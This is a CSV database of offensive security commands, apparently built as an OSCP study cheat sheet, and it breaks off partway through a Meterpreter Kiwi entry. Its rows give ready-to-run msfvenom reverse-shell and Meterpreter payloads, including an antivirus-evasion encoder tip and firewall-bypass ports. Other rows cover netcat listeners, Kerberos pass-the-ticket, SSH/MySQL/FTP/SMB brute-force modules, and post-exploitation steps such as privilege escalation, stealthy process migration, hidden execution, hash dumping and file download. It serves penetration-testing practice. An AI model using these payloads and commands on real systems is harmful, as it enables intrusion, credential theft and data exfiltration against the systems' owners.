"msfvenom-linux-x64-meterpreter","MSFVenom Linux x64 Meterpreter","exploitation","msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT>","Generate 64-bit Linux Meterpreter reverse shell (requires Metasploit handler)","metasploit","msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o meterpreter-x64.elf","OSCP:
Counts as Metasploit usage (one module limit).

Staged payload requires multi/handler.

Use shell_reverse_tcp for non-Metasploit listener.","medium","","","","","{""-p"": ""Payload type (staged Meterpreter)"", ""LHOST="": ""Attacker IP"", ""LPORT="": ""Attacker port"", ""-f"": ""Output format (elf)"", ""-o"": ""Output file""}","[""msf-handler-setup""]","[""msfvenom-linux-elf""]",""
"msfvenom-windows-shell-tcp","MSFVenom Windows Reverse Shell","exploitation","msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT>","Generate Windows reverse shell executable (non-staged, works with nc)","metasploit","msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe","Non-staged (underscore) works with netcat listener.

For AV evasion:
-e x86/shikata_ga_nai -i 10.

Use port 443 or 80 for firewall bypass.","high","","","","","{""-p"": ""Payload type (non-staged shell)"", ""LHOST="": ""Attacker IP"", ""LPORT="": ""Attacker port"", ""-f"": ""Output format (exe for Windows)"", ""-o"": ""Output file"", ""-e"": ""Encoder for AV evasion (optional)""}","[""nc-listener""]","[""msfvenom-windows-exe""]",""
"msfvenom-windows-meterpreter-tcp","MSFVenom Windows Meterpreter","exploitation","msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT>","Generate Windows Meterpreter reverse shell (requires Metasploit handler)","metasploit","msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o meterpreter.exe","OSCP:
Counts as Metasploit usage (one module limit).

Staged payload (/) requires multi/handler.

Use shell_reverse_tcp for nc listener.","medium","","","","","{""-p"": ""Payload type (staged Meterpreter)"", ""LHOST="": ""Attacker IP"", ""LPORT="": ""Attacker port"", ""-f"": ""Output format (exe)"", ""-o"": ""Output file""}","[""msf-handler-setup""]","[""msfvenom-windows-exe""]",""
"google-exploitdb-search","Google ExploitDB Search Query","exploitation","google: site:exploit-db.com <SERVICE>","Manual Google search query to find ExploitDB entries for specific service (not executable command)","general","google: site:exploit-db.com ProFTPD 1.3.5","This is a manual search query for web browser, not an executable command.

Use in Google search bar.

Offline alternative:
searchsploit <SERVICE>.

OSCP exam:
searchsploit preferred (no internet).","medium","","","","","","","[""searchsploit-service-version"", ""searchsploit-cve-lookup""]",""
"curl-web-server-verify","Verify Web Server Status","exploitation","curl -I http://<TARGET>:<PORT>","Check if web server is up and retrieve HTTP headers","web-exploitation","curl -I http://192.168.45.100:80","Quick verification before enumeration.

Headers reveal server type (Apache, nginx, IIS), technology (PHP, ASP.NET), potential vulnerabilities.","high","","","","","{""-I"": ""Fetch headers only (HEAD request)"", ""-k"": ""Skip SSL certificate verification (for HTTPS)"", ""-v"": ""Verbose output (optional)""}","[""nmap-service-scan""]","[""whatweb-technology-id""]","[""gobuster-dir-common"", ""nikto-scan"", ""whatweb-enum""]"
"whatweb-technology-id","Identify Web Technologies","exploitation","whatweb http://<TARGET>","Identify web server, frameworks, CMS, and technologies in use","web-exploitation","whatweb http://192.168.45.100","Identifies WordPress, Joomla, Drupal, etc.

Technology stack informs attack strategy (PHP exploits, ASP.NET deserialization, etc.).","high","","","","","{""-a"": ""Aggression level (1=stealthy, 3=aggressive)"", ""-v"": ""Verbose output""}","","[""curl-web-server-verify""]",""
"nc-listener-non-staged","Netcat Listener for Non-Staged Shells","exploitation","nc -nvlp <LPORT>","Start netcat listener for non-staged reverse shells (shell_reverse_tcp, not meterpreter)","general","nc -nvlp 4444","For non-staged payloads (underscore):
shell_reverse_tcp, cmd_reverse_tcp.

Staged payloads (slash) require multi/handler.

Use rlwrap for better shell.","high","","","","","{""-n"": ""No DNS resolution (faster)"", ""-v"": ""Verbose output"", ""-l"": ""Listen mode"", ""-p"": ""Port number""}","","[""rlwrap-nc-listener"", ""msf-handler-setup""]",""
"rlwrap-nc-listener","Netcat Listener with Readline Support","exploitation","rlwrap nc -lvnp <LPORT>","Netcat listener with arrow keys, history, and command editing (readline wrapper)","general","rlwrap nc -lvnp 4444","Quality of life improvement for interactive shells.

Arrow keys and history work immediately.

Essential for Windows shells without Python.","high","","","","","{""rlwrap"": ""Readline wrapper adds arrow keys, history, tab completion"", ""-l"": ""Listen mode"", ""-v"": ""Verbose"", ""-n"": ""No DNS"", ""-p"": ""Port""}","","[""nc-listener-non-staged""]",""
"ls-metasploit-auxiliary","List Metasploit Auxiliary Scanners","exploitation","ls /usr/share/metasploit-framework/modules/auxiliary/scanner/<SERVICE>/","List available Metasploit auxiliary modules for specific service enumeration","metasploit","ls /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/","OSCP:
Limited Metasploit usage.

Common services:
smb, http, ftp, ssh, mysql, postgres, mssql.

Auxiliary modules don't count toward exploit module limit.","low","","","","","","","[""msfconsole-search""]",""
"msfvenom-windows-x64-meterpreter-tcp","MSFVenom Windows x64 Meterpreter Alternative","exploitation","msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT>","Generate 64-bit Windows Meterpreter non-staged payload (works with nc or multi/handler)","metasploit","msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o meterpreter-x64.exe","Non-staged (underscore) Meterpreter.

Larger file size but single-stage delivery.

OSCP:
Counts as Metasploit usage.","medium","","","","","{""-p"": ""Payload (non-staged with underscore)"", ""LHOST="": ""Attacker IP"", ""LPORT="": ""Attacker port"", ""-f"": ""Format (exe)"", ""-o"": ""Output file""}","[""msf-handler-setup""]","[""msfvenom-windows-meterpreter-tcp""]",""
"msfvenom-linux-x64-meterpreter-non-staged","MSFVenom Linux x64 Meterpreter Non-Staged","exploitation","msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT>","Generate 64-bit Linux Meterpreter non-staged payload","metasploit","msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o meterpreter-linux-x64.elf","OSCP:
Counts as Metasploit usage.

Non-staged larger but single delivery.

Use shell_reverse_tcp for nc listener.","medium","","","","","{""-p"": ""Payload (non-staged)"", ""LHOST="": ""Attacker IP"", ""LPORT="": ""Attacker port"", ""-f"": ""Format (elf)"", ""-o"": ""Output file""}","[""msf-handler-setup""]","[""msfvenom-linux-x64-meterpreter""]",""
"msfvenom-jsp-war-shell","MSFVenom JSP WAR Reverse Shell","exploitation","msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o <OUTPUT>","Generate Java JSP reverse shell packaged as WAR file for Tomcat deployment","metasploit","msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war","For Tomcat exploitation with manager access.

Deploy via /manager/html upload.

Default Tomcat port:
8080.

Non-staged payload works with nc.","high","","","","","{""-p"": ""Payload (JSP shell for Tomcat)"", ""LHOST="": ""Attacker IP"", ""LPORT="": ""Attacker port"", ""-f"": ""Format (war for Tomcat deployment)"", ""-o"": ""Output file""}","[""nc-listener""]","",""
"rubeus-ptt","Rubeus Pass-the-Ticket","exploitation","Rubeus.exe ptt /ticket:<FILE>","Import Kerberos ticket into current session for authentication (Pass-the-Ticket attack)","active-directory","Rubeus.exe ptt /ticket:ticket.kirbi","OSCP:
Pass-the-Ticket attack using stolen Kerberos tickets.

Requires Windows host.

Rubeus.exe must be uploaded to target.

Alternative:
Mimikatz.","high","","","","","{""ptt"": ""Pass-the-ticket command"", ""/ticket:"": ""Ticket file to import""}","[""mimikatz-sekurlsa-tickets-export"", ""passticket-mimikatz-export""]","[""passticket-mimikatz-inject"", ""pth-mimikatz-sekurlsa""]","[""evil-winrm-shell"", ""psexec-impacket-shell"", ""bloodhound-upload-data""]"
"msf-show-auxiliary","List All Auxiliary Modules","exploitation","show auxiliary","Display all available auxiliary modules including scanners, fuzzers, denial-of-service modules, and protocol-specific enumeration tools","metasploit","","Output is very long (900+ modules).

Use 'search' with filters instead for practical use.

Auxiliary modules don't directly exploit but support enumeration, fuzzing, and reconnaissance.","low","","","","{""outdated_modules"": ""Update Metasploit: sudo apt update && sudo apt upgrade metasploit-framework""}","","[""msf-console-start""]","[""msf-search-auxiliary""]","[""msf-search-auxiliary""]"
"msf-search-auxiliary","Search for Auxiliary Modules","exploitation","search type:auxiliary <SERVICE>","Search for auxiliary modules related to specific service or protocol","metasploit","search type:auxiliary smb","Common auxiliary categories:
scanner (port/service scanning), gather (information gathering), admin (administrative tasks), fuzzers (protocol fuzzing), dos (denial of service).","high","","","","{""no_results"": ""Try broader search term (e.g., 'smb' instead of 'smb_version')""}","{""type:auxiliary"": ""Filter to auxiliary modules only"", ""platform:<OS>"": ""Filter by target platform""}","[""msf-console-start""]","","[""msf-use-module"", ""msf-info-module""]"
"msf-aux-smb-version","SMB Version Detection","exploitation","use auxiliary/scanner/smb/smb_version; set RHOSTS <TARGET>; run","Detect SMB protocol version and OS information from target Windows/Samba hosts","metasploit","use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.45.100; run","Automatically checks for SMB signing requirement (stored as vulnerability if disabled).

Detects SMB 1.0, 2.0, 2.1, 3.0, 3.1.1 versions.

Use THREADS=10 for faster network-wide scanning.","high","","","","{""connection_refused"": ""Port 445 may be filtered or closed"", ""timeout"": ""Increase timeout or reduce THREADS value""}","{""RHOSTS"": ""Target host(s) - accepts IP, range, CIDR, or file:path"", ""THREADS"": ""Number of concurrent threads (default: 1)""}","[""msf-use-module""]","","[""msf-db-vulns"", ""msf-aux-smb-enumshares""]"
"msf-aux-smb-enumshares","SMB Share Enumeration","exploitation","use auxiliary/scanner/smb/smb_enumshares; set RHOSTS <TARGET>; run","Enumerate accessible SMB shares on Windows/Samba targets","metasploit","use auxiliary/scanner/smb/smb_enumshares; set RHOSTS 192.168.45.100; run","Tests both authenticated and unauthenticated access.

Look for writable shares (WRITE permission) for potential initial access.

Common interesting shares:
SYSVOL, NETLOGON, C$, ADMIN$.","high","","","","{""access_denied"": ""Try with credentials: set SMBUser <USER>; set SMBPass <PASS>"", ""no_null_session"": ""NULL sessions disabled - credentials required""}","{""RHOSTS"": ""Target host(s)"", ""SMBUser"": ""Username for authenticated enumeration (optional)"", ""SMBPass"": ""Password for authenticated enumeration (optional)"", ""SMBDomain"": ""Domain for authentication (optional)""}","[""msf-use-module""]","","[""smbclient-connect"", ""smbmap-enumerate-auth""]"
"msf-aux-ssh-login","SSH Login Scanner (Brute Force)","exploitation","use auxiliary/scanner/ssh/ssh_login; set RHOSTS <TARGET>; set USERNAME <USER>; set PASS_FILE <WORDLIST>; run","Perform SSH password brute force attack with username and password list","metasploit","use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.45.100; set USERNAME admin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run","Creates session automatically on success (unlike Hydra).

Use STOP_ON_SUCCESS=true to stop after first valid credential.

Default THREADS=1 is very slow - increase for practical use.

Be aware of account lockout policies.","medium","","","","{""connection_refused"": ""Check RPORT if SSH runs on non-standard port"", ""too_slow"": ""Increase THREADS value (default is very slow)"", ""account_lockout"": ""Reduce THREADS or add delays to avoid detection""}","{""RHOSTS"": ""Target host(s)"", ""RPORT"": ""SSH port (default: 22)"", ""USERNAME"": ""Single username to test"", ""USER_FILE"": ""File containing usernames (alternative to USERNAME)"", ""PASSWORD"": ""Single password to test"", ""PASS_FILE"": ""File containing passwords (alternative to PASSWORD)"", ""USERPASS_FILE"": ""File with user:pass pairs (space-separated)"", ""STOP_ON_SUCCESS"": ""Stop after first successful login (default: false)"", ""THREADS"": ""Number of concurrent attempts (default: 1)""}","[""msf-use-module""]","","[""msf-session-interact"", ""msf-db-creds""]"
"msf-aux-mysql-login","MySQL Login Scanner","exploitation","use auxiliary/scanner/mysql/mysql_login; set RHOSTS <TARGET>; set USERNAME root; set PASS_FILE <WORDLIST>; run","Brute force MySQL authentication with username and password combinations","metasploit","use auxiliary/scanner/mysql/mysql_login; set RHOSTS 192.168.45.100; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run","Common MySQL default usernames:
root, mysql, admin.

Try BLANK_PASSWORDS=true first.

Successful login provides database access via mysql client:
mysql -h <TARGET> -u <USER> -p<PASS>","medium","","","","{""connection_refused"": ""MySQL may only bind to localhost - check with: nmap -p 3306 <TARGET>"", ""host_not_allowed"": ""MySQL configured to reject connections from attacker IP""}","{""RHOSTS"": ""Target MySQL server(s)"", ""RPORT"": ""MySQL port (default: 3306)"", ""USERNAME"": ""Single username"", ""PASS_FILE"": ""Password file path"", ""BLANK_PASSWORDS"": ""Try blank password for each user (default: false)"", ""STOP_ON_SUCCESS"": ""Stop after first success (default: false)""}","[""msf-use-module""]","",""
"msf-aux-ftp-version","FTP Version Scanner","exploitation","use auxiliary/scanner/ftp/ftp_version; set RHOSTS <TARGET>; run","Detect FTP server version via banner grabbing","metasploit","use auxiliary/scanner/ftp/ftp_version; set RHOSTS 192.168.45.0/24; run","Banner grabbing is passive and unlikely to trigger alarms.

Look for version numbers to search exploits.

Common vulnerable FTP servers:
vsftpd 2.3.4 (backdoor), ProFTPD 1.3.3c (backdoor).","medium","","","","{""no_banner"": ""Some FTP servers hide banners - use manual connection to verify""}","{""RHOSTS"": ""Target host(s)"", ""RPORT"": ""FTP port (default: 21)"", ""THREADS"": ""Concurrent threads for scanning""}","[""msf-use-module""]","","[""msf-search-exploit""]"
"msf-aux-ftp-anonymous","FTP Anonymous Access Scanner","exploitation","use auxiliary/scanner/ftp/anonymous; set RHOSTS <TARGET>; run","Test for anonymous FTP login and enumerate accessible files","metasploit","use auxiliary/scanner/ftp/anonymous; set RHOSTS 192.168.45.100; run","Successful anonymous access often leads to:
file exfiltration, configuration file access, or writable directories for payload upload.

Check for home directories, backup files, and web roots.","high","","","","{""login_denied"": ""Anonymous access disabled (common security practice)""}","{""RHOSTS"": ""Target host(s)"", ""RPORT"": ""FTP port (default: 21)""}","[""msf-use-module""]","",""
"msf-aux-portscan-tcp","TCP Port Scanner","exploitation","use auxiliary/scanner/portscan/tcp; set RHOSTS <TARGET>; set PORTS <PORTS>; run","Perform TCP SYN port scan from within Metasploit","metasploit","use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.45.0/24; set PORTS 1-1000; run","Generally slower than nmap.

Use for situations where nmap unavailable or need results in Metasploit database.

Does not detect service versions - use db_nmap -sV for that.","low","","","","{""very_slow"": ""Increase THREADS or use nmap instead (faster)"", ""incomplete_results"": ""Increase TIMEOUT value""}","{""RHOSTS"": ""Target host(s)"", ""PORTS"": ""Ports to scan (e.g., 1-65535, 80,443,8080, 1-1000)"", ""THREADS"": ""Number of concurrent threads"", ""TIMEOUT"": ""Connection timeout in milliseconds""}","[""msf-use-module""]","","[""msf-db-services""]"
"msf-aux-http-dir-scanner","HTTP Directory Scanner","exploitation","use auxiliary/scanner/http/dir_scanner; set RHOSTS <TARGET>; set DICTIONARY <WORDLIST>; run","Brute force web directories and files using wordlist","metasploit","use auxiliary/scanner/http/dir_scanner; set RHOSTS 192.168.45.100; set DICTIONARY /usr/share/wordlists/dirb/common.txt; run","Metasploit's directory scanner is significantly slower than dedicated tools like gobuster.

Consider using alternatives for practical engagements.

Useful when integrated workflow requires database storage.","low","","","","{""very_slow"": ""Use gobuster or feroxbuster instead (much faster)"", ""false_positives"": ""Filter by response codes and content length""}","{""RHOSTS"": ""Target web server(s)"", ""RPORT"": ""Web server port (default: 80)"", ""DICTIONARY"": ""Wordlist file path"", ""PATH"": ""Base path to scan (default: /)"", ""THREADS"": ""Concurrent threads"", ""SSL"": ""Use HTTPS (default: false)""}","[""msf-use-module""]","","[""gobuster-dir"", ""nikto-scan""]"
"msf-aux-ssh-version","SSH Version Detection Scanner","exploitation","use auxiliary/scanner/ssh/ssh_version; set RHOSTS <TARGET>; run","Detect SSH server version via banner grabbing","metasploit","use auxiliary/scanner/ssh/ssh_version; set RHOSTS 192.168.45.100; run","Banner reveals SSH version for exploit research. Look for outdated versions vulnerable to CVEs. Results auto-stored in MSF database.","high","","","","","{""RHOSTS"": ""Target host(s) - accepts IP, range, or CIDR"", ""THREADS"": ""Concurrent threads for scanning""}","","",""
"msf-aux-http-version","HTTP Server Version Detection","exploitation","use auxiliary/scanner/http/http_version; set RHOSTS <TARGET>; run","Detect HTTP server version and technology via headers and responses","metasploit","use auxiliary/scanner/http/http_version; set RHOSTS 192.168.45.100; run","Reveals web server software and version. Use for identifying vulnerable versions. Results stored in MSF database for later querying.","high","","","","","{""RHOSTS"": ""Target host(s)"", ""RPORT"": ""HTTP port (default: 80)"", ""SSL"": ""Use HTTPS (default: false)""}","","",""
"msf-aux-smb-ms17010","MS17-010 EternalBlue Vulnerability Scanner","exploitation","use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS <TARGET>; run","Scan for MS17-010 (EternalBlue) SMB vulnerability on Windows hosts","metasploit","use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.45.100; run","Checks for MS17-010 (EternalBlue) SMB vulnerability. If vulnerable, use exploit/windows/smb/ms17_010_eternalblue for exploitation. OSCP classic - quick win on unpatched Windows 7/Server 2008.","high","","","","","{""RHOSTS"": ""Target host(s) - IP, range, or CIDR"", ""THREADS"": ""Number of concurrent threads for scanning""}","","",""
"msf-aux-smb-shares","SMB Share Enumeration Scanner","exploitation","use auxiliary/scanner/smb/smb_enumshares; set RHOSTS <TARGET>; run","Enumerate accessible SMB shares on Windows/Samba targets","metasploit","use auxiliary/scanner/smb/smb_enumshares; set RHOSTS 192.168.45.100; run","Lists accessible SMB shares with permissions. Look for writable shares. Add credentials with SMBUser/SMBPass for authenticated enumeration.","high","","","","","{""RHOSTS"": ""Target host(s)"", ""SMBUser"": ""Username for authenticated enum (optional)"", ""SMBPass"": ""Password for authenticated enum (optional)""}","","",""
"msf-aux-smb-users","SMB User Enumeration Scanner","exploitation","use auxiliary/scanner/smb/smb_enumusers; set RHOSTS <TARGET>; run","Enumerate users via SMB on Windows targets","metasploit","use auxiliary/scanner/smb/smb_enumusers; set RHOSTS 192.168.45.100; run","Enumerates local users via SMB. Often blocked by modern Windows. Useful for older systems with null sessions enabled.","high","","","","","{""RHOSTS"": ""Target host(s)"", ""SMBUser"": ""Username for authenticated enum (optional)"", ""SMBPass"": ""Password for authenticated enum (optional)""}","","",""
"msf-aux-smb-login","SMB Login Scanner","exploitation","use auxiliary/scanner/smb/smb_login; set RHOSTS <TARGET>; set SMBUser <USER>; set SMBPass <PASS>; run","Test SMB credentials and check for admin access on Windows hosts","metasploit","use auxiliary/scanner/smb/smb_login; set RHOSTS 192.168.45.100; set SMBUser admin; set SMBPass Password123; run","Tests SMB credentials across multiple hosts. Look for 'Administrator access: Yes' for admin-level access. Can spray passwords across network.","high","","","","","{""RHOSTS"": ""Target host(s)"", ""SMBUser"": ""Username for authentication"", ""SMBPass"": ""Password for authentication"", ""SMBDomain"": ""Domain name (optional)""}","","",""
"msf-aux-ftp-login","FTP Login Scanner","exploitation","use auxiliary/scanner/ftp/ftp_login; set RHOSTS <TARGET>; set USERNAME <USER>; set PASS_FILE <WORDLIST>; run","Brute force FTP login credentials","metasploit","use auxiliary/scanner/ftp/ftp_login; set RHOSTS 192.168.45.100; set USERNAME admin; set PASS_FILE /usr/share/wordlists/rockyou.txt; run","Tests FTP credentials. Try anonymous:anonymous first. Look for Success: username:password in output.","high","","","","","{""RHOSTS"": ""Target host(s)"", ""USERNAME"": ""Single username to test"", ""PASS_FILE"": ""Password wordlist path""}","","",""
"msf-aux-http-dirscanner","HTTP Directory Scanner","exploitation","use auxiliary/scanner/http/dir_scanner; set RHOSTS <TARGET>; set DICTIONARY <WORDLIST>; run","Enumerate directories on web server using wordlist","metasploit","use auxiliary/scanner/http/dir_scanner; set RHOSTS 192.168.45.100; set DICTIONARY /usr/share/wordlists/dirb/common.txt; run","Alternative to gobuster/feroxbuster. Results stored in MSF database. Use smaller wordlists for speed (common.txt, then big.txt).","medium","","","","","{""RHOSTS"": ""Target host(s)"", ""DICTIONARY"": ""Wordlist for directory brute-forcing"", ""RPORT"": ""HTTP port (default: 80)""}","","",""
"msf-aux-http-robots","HTTP Robots.txt Scanner","exploitation","use auxiliary/scanner/http/robots_txt; set RHOSTS <TARGET>; run","Retrieve and parse robots.txt file for hidden paths","metasploit","use auxiliary/scanner/http/robots_txt; set RHOSTS 192.168.45.100; run","Extracts Disallow and Allow paths from robots.txt. Often reveals hidden admin panels, backup files, or sensitive directories that should be investigated.","medium","","","","","{""RHOSTS"": ""Target host(s)"", ""RPORT"": ""HTTP port (default: 80)""}","","",""
"meterpreter-help","Display Meterpreter Help","exploitation","help","List all available Meterpreter commands organized by category","metasploit","","Commands organized by category:
Core Commands, File System, System, Networking, Webcam, Audio, Sniffer, etc.

Use 'help <command>' for detailed syntax.","medium","","","","","","","",""
"meterpreter-background","Background Meterpreter Session","exploitation","background","Send current Meterpreter session to background and return to msfconsole","metasploit","","Session remains active in background.

Return with:
sessions -i <ID>.

Use Ctrl+Z as quick shortcut.","high","","","","","","","","[""msf-session-interact""]"
"meterpreter-sysinfo","Display System Information","exploitation","sysinfo","Get target system information (OS, architecture, computer name, domain)","metasploit","","First command to run after gaining Meterpreter access.

Provides OS version for exploit/privesc selection.

Shows domain membership for lateral movement planning.","high","","","","","","","","[""meterpreter-getuid"", ""meterpreter-ps""]"
"meterpreter-getuid","Get Current User Context","exploitation","getuid","Display username and privileges of current Meterpreter process","metasploit","","Check immediately to determine privilege escalation needs.

NT AUTHORITY\SYSTEM = highest Windows privileges.

Root = highest Linux privileges.","high","","","","","","","","[""meterpreter-getsystem"", ""meterpreter-getprivs""]"
"meterpreter-getprivs","Display Current Privileges","exploitation","getprivs","List all privileges enabled for current process (Windows only)","metasploit","","Key privileges:
SeImpersonatePrivilege (token impersonation), SeDebugPrivilege (process debugging), SeBackupPrivilege (file access).

Use for identifying privesc paths.","high","","","","{""linux_not_supported"": ""Command is Windows-only - use 'shell' and traditional Linux enumeration""}","","","","[""meterpreter-getsystem""]"
"meterpreter-getsystem","Escalate to SYSTEM Privileges","exploitation","getsystem","Attempt privilege escalation to NT AUTHORITY\SYSTEM using multiple techniques","metasploit","","Requires local admin privileges.

Techniques use named pipe impersonation or token duplication.

PrintSpooler variant (technique 4) most reliable on modern Windows.","high","","","","{""all_techniques_failed"": ""Requires SeImpersonatePrivilege or SeDebugPrivilege - check with getprivs"", ""access_denied"": ""Current user must be local administrator"", ""technique_blocked"": ""Try specific technique: getsystem -t <NUMBER>""}","{""getsystem"": ""Try all techniques automatically"", ""getsystem -t 0"": ""Technique 0: Token Duplication"", ""getsystem -t 1"": ""Technique 1: Named Pipe Impersonation (In Memory/Admin)"", ""getsystem -t 2"": ""Technique 2: Named Pipe Impersonation (Dropper/Admin)"", ""getsystem -t 3"": ""Technique 3: Named Pipe Impersonation (RPCSS variant)"", ""getsystem -t 4"": ""Technique 4: Named Pipe Impersonation (PrintSpooler variant)""}","","","[""meterpreter-hashdump"", ""meterpreter-load-kiwi""]"
"meterpreter-ps","List Running Processes","exploitation","ps","Display all running processes with PID, name, architecture, session, user, and path","metasploit","","Identify stable processes for migration (explorer.exe, svchost.exe).

Look for user-owned processes to match integrity level.

Note architecture (x86 vs x64) for migration compatibility.","high","","","","{""incomplete_list"": ""Some processes hidden if not running as SYSTEM""}","","","","[""meterpreter-migrate""]"
"meterpreter-migrate","Migrate to Different Process","exploitation","migrate <PID>","Move Meterpreter execution to different process for stability and stealth","metasploit","migrate 1234","Migrate ASAP after initial access to prevent session loss.

Choose long-running stable processes (explorer.exe, svchost.exe).

Match architecture.

Migration changes user context.","high","","","","{""access_denied"": ""Can only migrate to processes at same/lower privilege level"", ""architecture_mismatch"": ""Cannot migrate x64 Meterpreter to x86 process (or vice versa)"", ""process_died"": ""Target process crashed - choose more stable process"", ""lost_privileges"": ""Migrated to lower-privilege process - use getsystem first if needed""}","","[""meterpreter-ps""]","","[""meterpreter-getuid""]"
"meterpreter-execute","Execute Program on Target","exploitation","execute -f <PROGRAM> -a '<ARGS>' -i -H","Start program on target system with optional arguments, interaction, and hidden window","metasploit","execute -f notepad.exe -a 'C:\temp\file.txt' -i -H","Use -H to avoid alerting user.

Common uses:
execute -f notepad.exe -H (hidden notepad for migration target), execute -f cmd.exe -i (interactive shell).","medium","","","","{""file_not_found"": ""Use full path for executables not in PATH"", ""window_appears"": ""Use -H flag to hide window from user"", ""access_denied"": ""Insufficient privileges to execute in specified location""}","{""-f"": ""File/program to execute"", ""-a"": ""Arguments to pass to program"", ""-H"": ""Create hidden process (no window)"", ""-i"": ""Interact with process (channels I/O)"", ""-c"": ""Channelize input/output"", ""-t"": ""Execute with currently impersonated thread token""}","","","[""meterpreter-ps"", ""meterpreter-migrate""]"
"meterpreter-shell","Drop to System Shell","exploitation","shell","Open interactive system shell (cmd.exe on Windows, /bin/sh on Linux)","metasploit","","Creates channel for shell I/O.

Use Ctrl+Z to background shell and return to Meterpreter (don't use 'exit' which kills channel).

Shell runs in current process context.","high","","","","{""no_prompt"": ""Shell may be waiting for input - try pressing Enter"", ""exit_meterpreter"": ""DO NOT type 'exit' - use Ctrl+Z to return to Meterpreter"", ""session_hung"": ""Background with Ctrl+Z if shell hangs""}","","","",""
"meterpreter-pwd","Print Working Directory","exploitation","pwd","Display current working directory on target system","metasploit","","Shows target system's current directory, not local machine.

Use before file operations to verify location.","medium","","","","","","","","[""meterpreter-ls"", ""meterpreter-cd""]"
"meterpreter-ls","List Directory Contents","exploitation","ls <PATH>","List files and directories at specified path or current directory","metasploit","ls C:\Users\Administrator\Desktop","Look for sensitive files:
proof.txt, local.txt, passwords, .config, .ssh, database files.

Use -r for recursive listing.","high","","","","{""access_denied"": ""Insufficient permissions to read directory"", ""windows_paths"": ""Escape backslashes or use forward slashes: C:/Users or C:\\\\Users""}","{""-S"": ""Search recursively"", ""-r"": ""List recursively""}","","","[""meterpreter-download"", ""meterpreter-cat""]"
"meterpreter-cd","Change Directory","exploitation","cd <PATH>","Change current working directory on target system","metasploit","cd C:\Users\Administrator","Navigate to user directories, Desktop, Documents for sensitive files.

Common targets:
C:/Users/<USER>/Desktop, /home/<USER>, /root","medium","","","","{""windows_paths"": ""Use forward slashes (C:/Users) or escaped backslashes (C:\\\\Users)""}","","","","[""meterpreter-ls"", ""meterpreter-pwd""]"
"meterpreter-download","Download File from Target","exploitation","download <REMOTE_FILE> <LOCAL_PATH>","Transfer file from target system to attacker machine","metasploit","download C:\Users\Administrator\Desktop\proof.txt /home/kali/loot/proof.txt","Download proof flags, sensitive files, SAM database, configuration files.

Use -r for directories.

Change local directory first with 'lcd'.","high","","","","{""access_denied"": ""File may be locked or insufficient permissions"", ""large_file_slow"": ""Meterpreter download can be slow - consider alternative methods for large files"", ""local_path_error"": ""Ensure local destination directory exists""}","{""-r"": ""Recursively download directory""}","[""meterpreter-ls""]","",""
"meterpreter-upload","Upload File to Target","exploitation","upload <LOCAL_FILE> <REMOTE_PATH>","Transfer file from attacker machine to target system","metasploit","upload /usr/bin/unix-privesc-check C:\Temp\privesc.exe","Upload privilege escalation tools, persistence payloads, enumeration scripts.

Common targets:
/tmp (Linux), C:\Windows\Temp (Windows).","high","","","","{""access_denied"": ""Upload to writable directory: C:\\Windows\\Temp, C:\\Temp, /tmp"", ""large_file_slow"": ""Meterpreter upload can be slow - consider hosting HTTP server"", ""file_locked"": ""Cannot overwrite running executables - use different filename"", ""windows_backslash"": ""Escape backslashes: C:\\\\Temp or use forward slashes: C:/Temp""}","{""-r"": ""Recursively upload directory""}","","","[""meterpreter-execute""]"
"meterpreter-cat","Display File Contents","exploitation","cat <FILE>","Read and display file contents from target system","metasploit","cat C:\Users\Administrator\Desktop\proof.txt","Quick way to read flags, passwords, config files.

For binary files or large files, use download instead.","high","","","","{""binary_file"": ""Binary files will display garbage - use download instead"", ""large_file"": ""cat displays entire file - use download for large files""}","","","",""
"meterpreter-search","Search for Files","exploitation","search -f <FILENAME> -d <DIRECTORY>","Search target filesystem for files matching pattern","metasploit","search -f *.txt -d C:\Users","Common searches:
-f proof.txt, -f local.txt, -f *.kdbx, -f *.config, -f *password*.

Search can be slow on large filesystems.","high","","","","{""search_very_slow"": ""Searching entire drive takes time - narrow search with -d"", ""access_denied_paths"": ""Some directories inaccessible - normal with limited privileges""}","{""-f"": ""Filename pattern (supports * wildcard)"", ""-d"": ""Directory to search"", ""-r"": ""Search recursively (default: true)""}","","","[""meterpreter-download"", ""meterpreter-cat""]"
"meterpreter-hashdump","Dump Password Hashes","exploitation","hashdump","Extract password hashes from Windows SAM database (requires SYSTEM privileges)","metasploit","","Requires SYSTEM privileges.

Dumps LM and NTLM hashes.

Hashes automatically stored in Metasploit database.

Use hashcat or John to crack offline.","high","","","","{""access_denied"": ""Must run as NT AUTHORITY\\SYSTEM - use getsystem first"", ""priv_error"": ""Migrate to SYSTEM process before hashdump""}","","[""meterpreter-getsystem""]","","[""hashcat-crack"", ""msf-db-creds""]"
"meterpreter-load-kiwi","Load Kiwi Extension (Mimikatz)","exploitation","load kiwi","Load Kiwi extension providing Mimikatz capabilities for credential extraction","metasploit","","Kiwi is Metasploit's implementation of Mimikatz.

Provides commands:
